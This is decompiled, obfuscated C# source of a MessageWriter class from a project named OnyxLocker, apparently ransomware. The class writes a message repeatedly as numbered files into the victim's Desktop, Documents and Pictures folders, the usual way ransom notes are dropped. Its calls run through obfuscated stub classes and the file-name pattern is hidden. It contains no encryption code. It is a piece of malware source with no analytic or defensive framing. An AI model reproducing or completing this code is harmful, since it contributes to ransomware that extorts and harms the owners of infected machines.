using System;
using System.IO;
using A;

namespace OnyxLocker.Classes;

internal class MessageWriter
{
	private string Message { get; }

	private string FileName { get; }

	private int MessageCount { get; }

	public MessageWriter(string message, string fileName, int messageCount)
	{
		Message = message;
		FileName = fileName;
		MessageCount = messageCount;
	}

	public void WriteMessageToDesktop()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		c3a70f9bc32fda78ecc56dbe4958b2bb6.c757cc4db113ae43c821f8f25a1fa333e(this, folderPath, c2085eda7c3f2671af7e5d62368efcf42.c757cc4db113ae43c821f8f25a1fa333e(this), c3fa56075c944761a3de5521c044c0b03.c757cc4db113ae43c821f8f25a1fa333e(this), c5eb3ea90b3364815ec26d622d6ca7577.c757cc4db113ae43c821f8f25a1fa333e(this));
	}

	public void WriteMessageToDocuments()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
		c3a70f9bc32fda78ecc56dbe4958b2bb6.c757cc4db113ae43c821f8f25a1fa333e(this, folderPath, c2085eda7c3f2671af7e5d62368efcf42.c757cc4db113ae43c821f8f25a1fa333e(this), c3fa56075c944761a3de5521c044c0b03.c757cc4db113ae43c821f8f25a1fa333e(this), c5eb3ea90b3364815ec26d622d6ca7577.c757cc4db113ae43c821f8f25a1fa333e(this));
	}

	public void WriteMessageToPictures()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonPictures);
		c3a70f9bc32fda78ecc56dbe4958b2bb6.c757cc4db113ae43c821f8f25a1fa333e(this, folderPath, c2085eda7c3f2671af7e5d62368efcf42.c757cc4db113ae43c821f8f25a1fa333e(this), c3fa56075c944761a3de5521c044c0b03.c757cc4db113ae43c821f8f25a1fa333e(this), c5eb3ea90b3364815ec26d622d6ca7577.c757cc4db113ae43c821f8f25a1fa333e(this));
	}

	private void WriteMessages(string folderPath, string message, int messageCount, string fileName)
	{
		for (int i = 0; i < messageCount; i++)
		{
			string path = string.Format(cffd0443b4551df482d235e66317d4cd4.ce57b55ca454aabe14bf635b4c85d996c(7593), fileName, i);
			FileStream stream;
			FileStream fileStream = (stream = new FileStream(Path.Combine(folderPath, path), FileMode.OpenOrCreate));
			try
			{
				StreamWriter streamWriter;
				StreamWriter streamWriter2 = (streamWriter = new StreamWriter(stream));
				try
				{
					streamWriter.WriteLine(message);
				}
				finally
				{
					if (streamWriter2 != null)
					{
						while (true)
						{
							switch (3)
							{
							case 0:
								continue;
							}
							if (1 == 0)
							{
								/*OpCode not supported: LdMemberToken*/;
							}
							((IDisposable)streamWriter2).Dispose();
							break;
						}
					}
				}
			}
			finally
			{
				if (fileStream != null)
				{
					while (true)
					{
						switch (6)
						{
						case 0:
							continue;
						}
						((IDisposable)fileStream).Dispose();
						break;
					}
				}
			}
		}
	}
}
